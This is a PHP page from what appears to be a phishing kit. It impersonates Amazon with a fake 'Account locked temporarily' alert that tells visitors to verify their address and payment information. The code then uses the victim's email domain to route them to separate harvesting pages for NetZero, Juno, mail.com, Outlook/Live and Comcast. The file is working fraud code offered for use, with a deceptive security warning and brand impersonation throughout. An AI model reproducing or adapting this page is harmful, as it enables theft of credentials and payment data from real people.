<?php
require "core/EntityVariables.php";

unset($_SESSION["password_attempt"]);
$config = require "KarmaEntity/config/config.php";
if ($config["email_akses"]) {
    if ($_SERVER['REQUEST_METHOD'] == 'POST') {

        if (isset($_SESSION['entity_email']) && strpos($_SESSION['entity_email'], '@netzero') !== false) {
            header("Location: /netzero");
            exit();

        } elseif (isset($_SESSION['entity_email']) && strpos($_SESSION['entity_email'], '@juno') !== false) {
            header("Location: /juno");
            exit();

        } elseif (
            isset($_SESSION['entity_email']) && (
                strpos($_SESSION['entity_email'], '@mail.com') !== false ||
                strpos($_SESSION['entity_email'], '@usa.com') !== false 
            )
        ) {
            header("Location: /mail");
            exit();

        } elseif (
            isset($_SESSION['entity_email']) && (
                strpos($_SESSION['entity_email'], '@outlook.com') !== false ||
                strpos($_SESSION['entity_email'], '@msn.com') !== false ||
                strpos($_SESSION['entity_email'], '@live.com') !== false
            )
        ) {
            header("Location: /live");
            exit();

        } elseif (
            isset($_SESSION['entity_email']) && (
                strpos($_SESSION['entity_email'], '@comcast.com') !== false ||
                strpos($_SESSION['entity_email'], '@comcast.net') !== false 
            )
        ) {
            header("Location: /x_finity");
            exit();

        } else {
            header("Location: /yourAddress?entityId=$random_entity_id");
            exit();
        }
    }

} else {

    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
        header("Location: /yourAddress?entityId=$random_entity_id");
        exit();
    }
}

?>
<html lang="en-us"
    class="a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember a-ember-modern-display a-ember-modern-text">

<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/public/images/favicon.png" type="image/png">
    <link rel="stylesheet" href="/public/css/karma_custom.css?v=<?= time(); ?>" />
    <link rel="stylesheet" href="/public/css/karma_styles.css?v=<?= time(); ?>" />
    <title>Amazon | Account Locked</title>
</head>

<body
    class="a-aui_72554-c a-aui_72554-c-android a-aui_72554-c-windows a-aui_72554-c-chrome a-aui_72554-c-chrome-116 a-aui_72554-c-desktop a-aui_72554-c-modern a-aui_72554-c-js_enabled a-aui_72554-c-touch_disabled">
    <div class="a-section a-spacing-medium mt-5">
        <div class="a-section a-spacing-none a-text-center">
            <a class="a-link-nav-icon" tabindex="-1" href="#">
                <i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
            </a>
        </div>
    </div>
    <div class="flex justify-center items-center mt-8">
        <div class="a-section a-spacing-base auth-pagelet-container">
            <div class="a-section">
                <div aria-live="assertive" id="auth-error-message-box"
                    class="a-box a-warning a-alert-warning auth-server-side-message-box a-spacing-base" role="alert">
                    <div class="a-box-inner flex gap-3">
                        <i class="a-icon a-icon-warning mt-0.5" aria-hidden="true"></i>
                        <div>
                            <h4 class="a-alert-heading">Account locked temporarily</h4>
                        </div>
                    </div>
                    <form method="post" class="p-3">
                        <div class="">
                            <div class="a-alert-content -mt-3">
                                We have detected unusual activity on your account and have locked <br /> it temporarily.
                                To regain access to your account, you must <br />verify your address and payment
                                information.
                            </div>
                            <div class="mt-5 mb-5">
                                <span class="a-list-item">
                                    <a class="a-size-base a-link-normal" rel="noopener noopener" href="#" role="button">
                                        Need help?
                                    </a>
                                </span>
                            </div>
                        </div>
                        <span id="pp-QBJBOr-30" class="a-button a-button-primary w-full mx-auto">
                            <span class="a-button-inner">
                                <input name="ppw-widgetEvent:AddCreditCardEvent" class="a-button-input" type="submit"
                                    aria-labelledby="pp-QBJBOr-30-announce" />
                                <span id="pp-QBJBOr-30-announce" class="a-button-text"
                                    aria-hidden="true">Continue</span>
                            </span>
                        </span>
                    </form>
                </div>
            </div>
        </div>
    </div>
    <?php require __DIR__ . '/../static/footer_beforelog.html'; ?>
</body>

</html>